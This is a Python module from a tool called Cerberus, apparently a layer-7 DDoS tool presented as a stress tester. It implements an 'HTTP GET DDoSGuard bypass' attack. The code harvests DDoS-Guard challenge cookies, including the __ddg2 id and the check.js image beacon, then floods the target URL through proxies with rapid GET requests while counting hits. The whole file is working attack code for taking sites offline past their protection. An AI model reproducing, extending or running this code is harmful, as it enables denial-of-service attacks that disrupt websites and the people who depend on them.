'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests, re

from requests.cookies import create_cookie
from src.core import Core
from src.utils import *
from src.useragent import *

def flood(attack_id, url, stoptime) -> None:
    '''
    launches a HTTP GET flood
    '''

    if not Core.ddosguard_cookies_grabbed: # if no cookies have been found yet, we try and grab them first
        headers = utils().buildheaders(url)
        session = requests.session() # we can't use the utils().buildsession() function, because that one has a timeout of 0.1 ms
        idss = None

        try:
            with session.get(url, headers=headers, verify=False, proxies=utils().get_proxy()) as req:
                for key, value in req.cookies.items():
                    Core.session.cookies.set_cookie(create_cookie(key, value))
        except Exception:
            pass
        
        try:
            with session.post("https://check.ddos-guard.net/check.js", headers=headers, verify=False, proxies=utils().get_proxy()) as req:
                for key, value in req.cookies.items():
                    if key == '__ddg2':
                        idss = value

                    Core.session.cookies.set_cookie(create_cookie(key, value))
        except Exception:
            pass
        
        if idss:
            try:
                with session.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=headers, verify=False, proxies=utils().get_proxy()) as req:
                    for key, value in req.cookies.items():
                        Core.session.cookies.set_cookie(create_cookie(key, value))
            except Exception:
                pass
        
        try:
            with session.get("https://check.ddos-guard.net/check.js", headers=headers, verify=False, proxies=utils().get_proxy()) as req:
                src = re.search(r"new Image\(\).src = '(.+?)';", req.text)
                if src:
                    req = session.get(f'{urlparse(url).scheme}://{urlparse(url).netloc}{src[1]}')
                    for key, value in req.cookies.items():
                        Core.session.cookies.set_cookie(create_cookie(key, value))

        except Exception:
            pass

        Core.ddosguard_cookies_grabbed = True

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:

            Core.session.get(
                utils().buildblock(url), 
                headers=utils().buildheaders(url),
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None,
                proxies=utils().get_proxy()
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'DDG': {
        'info': 'HTTP GET DDoSGuard bypass',
        'func': flood
    }
})